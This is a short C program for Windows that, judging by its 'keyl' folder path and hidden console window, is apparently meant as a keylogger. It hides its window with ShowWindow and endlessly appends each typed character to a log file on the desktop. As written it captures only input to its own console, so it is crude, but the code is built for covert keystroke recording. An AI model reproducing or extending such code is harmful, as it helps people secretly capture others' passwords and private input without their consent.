#include <stdio.h>   
#include <conio.h>   
#include <windows.h>

#define PATH "C:/Users/User/Desktop/Linux/keyl/data.txt" // The path to the log file


int main()  
{  
    FILE *file;
    file = fopen(PATH, "a+");

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    while (1){
       putc(getch(), file); // print a character entered by the user  
    }
    return 0;  
}
